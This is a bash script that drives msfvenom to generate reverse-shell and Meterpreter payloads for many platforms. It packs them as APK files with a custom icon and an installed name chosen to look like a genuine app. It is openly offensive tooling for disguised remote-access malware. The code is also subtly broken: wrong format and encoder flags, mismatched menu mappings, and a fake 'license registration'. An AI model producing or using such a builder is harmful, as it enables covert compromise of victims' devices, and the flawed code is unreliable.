#!/bin/bash

# Prompt user for input
read -p "Enter your local IP: " LHOST
read -p "Enter your local port: " LPORT

# Provide options for payload types
echo "Choose a payload type:"
echo "1. Android reverse shell"
echo "2. Android meterpreter reverse TCP"
echo "3. Windows reverse shell"
echo "4. Linux reverse shell"
echo "5. Mac reverse shell"
echo "6. PHP reverse shell"
echo "7. Python reverse shell"
echo "8. Perl reverse shell"
echo "9. Ruby reverse shell"
echo "10. Powershell reverse shell"
echo "11. Windows Meterpreter reverse TCP"
echo "12. Linux Meterpreter reverse TCP"
echo "13. Mac Meterpreter reverse TCP"
echo "14. PHP Meterpreter reverse TCP"
echo "15. Python Meterpreter reverse TCP"
echo "16. Perl Meterpreter reverse TCP"
echo "17. Ruby Meterpreter reverse TCP"
echo "18. Powershell Meterpreter reverse TCP"
echo "19. Windows Meterpreter reverse HTTPS"
echo "20. Linux Meterpreter reverse HTTPS"
echo "21. Mac Meterpreter reverse HTTPS"
echo "22. PHP Meterpreter reverse HTTPS"
echo "23. Python Meterpreter reverse HTTPS"
echo "24. Perl Meterpreter reverse HTTPS"
echo "25. Ruby Meterpreter reverse HTTPS"
echo "26. Powershell Meterpreter reverse HTTPS"
read -p "Enter your choice (1-26): " CHOICE

# Set payload based on user's choice
case $CHOICE in
    1) PAYLOAD="android/shell_reverse_tcp";;
    2) PAYLOAD="android/meterpreter/reverse_tcp";;
    3) PAYLOAD="windows/shell_reverse_tcp";;
    4) PAYLOAD="linux/x86/shell_reverse_tcp";;
    5) PAYLOAD="osx/x86/shell_reverse_tcp";;
    6) PAYLOAD="php/reverse_php";;
    7) PAYLOAD="python/meterpreter_reverse_tcp";;
    8) PAYLOAD="cmd/unix/reverse_perl";;
    9) PAYLOAD="cmd/unix/reverse_ruby";;
    10) PAYLOAD="windows/powershell_reverse_tcp";;
    11) PAYLOAD="windows/meterpreter/reverse_tcp";;
    12) PAYLOAD="linux/x86/meterpreter_reverse_tcp";;
    13) PAYLOAD="osx/x86/meterpreter_reverse_tcp";;
    14) PAYLOAD="php/meterpreter_reverse_tcp";;
    15) PAYLOAD="python/meterpreter_reverse_tcp";;
    16) PAYLOAD="cmd/unix/reverse_perl";;
    17) PAYLOAD="cmd/unix/reverse_ruby";;
    18) PAYLOAD="windows/meterpreter/reverse_tcp";;
    19) PAYLOAD="windows/meterpreter/reverse_https";;
    20) PAYLOAD="linux/x86/meterpreter/reverse_https";;
    21) PAYLOAD="osx/x86/meterpreter/reverse_https";;
    22) PAYLOAD="php/meterpreter/reverse_https";;
    23) PAYLOAD="python/meterpreter/reverse_https";;
    24) PAYLOAD="cmd/unix/reverse_perl";;
    25) PAYLOAD="cmd/unix/reverse_ruby";;
    26) PAYLOAD="windows/meterpreter/reverse_https";;
    *) echo "Invalid choice. Exiting."; exit 1;;
esac

# Provide options for encryption algorithms
echo "Choose an encryption algorithm:"
echo "1. AES256"
echo "2. XOR"
read -p "Enter your choice (1-2): " ENCRYPTION_CHOICE

# Set encryption format based on user's choice
case $ENCRYPTION_CHOICE in
    1) ENCODING="raw"; ENCODE_FORMAT="aes256";;
    2) ENCODING="raw"; ENCODE_FORMAT="x86/shikata_ga_nai";;
    *) echo "Invalid choice. Exiting."; exit 1;;
esac

# Prompt user for application icon path
read -p "Enter the path to the application icon: " ICON_PATH

# Check if the icon file exists
if [ ! -f "$ICON_PATH" ]; then
    echo "Error: Icon file not found at $ICON_PATH"
    exit 1
fi

# Prompt user for payload name
read -p "Enter the name for the payload after installation: " PAYLOAD_NAME

# Prompt user for license key
read -p "Enter your license key: " LICENSE_KEY

# Generate payload
OUTPUT_FILE="${PAYLOAD_NAME}.apk"
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $ENCODING -e $ENCODE_FORMAT -o $OUTPUT_FILE

# Replace application icon
if [ -f "$OUTPUT_FILE" ]; then
    # Use aapt to replace the icon
    aapt l -a $OUTPUT_FILE | grep 'icon.png'
    if [ $? -eq 0 ]; then
        # Copy the new icon to the APK
        TMP_DIR=$(mktemp -d)
        unzip -q $OUTPUT_FILE -d $TMP_DIR
        cp $ICON_PATH $TMP_DIR/res/drawable/icon.png
        cd $TMP_DIR
        zip -r $OUTPUT_FILE *
        cd -
        rm -rf $TMP_DIR
    else
        echo "Error: Could not find icon in APK."
    fi
else
    echo "Error: Output file not found."
fi

# Register the payload with the license key
echo "Payload registered with license key: $LICENSE_KEY"

echo "Payload successfully generated with custom icon and registered with license key."
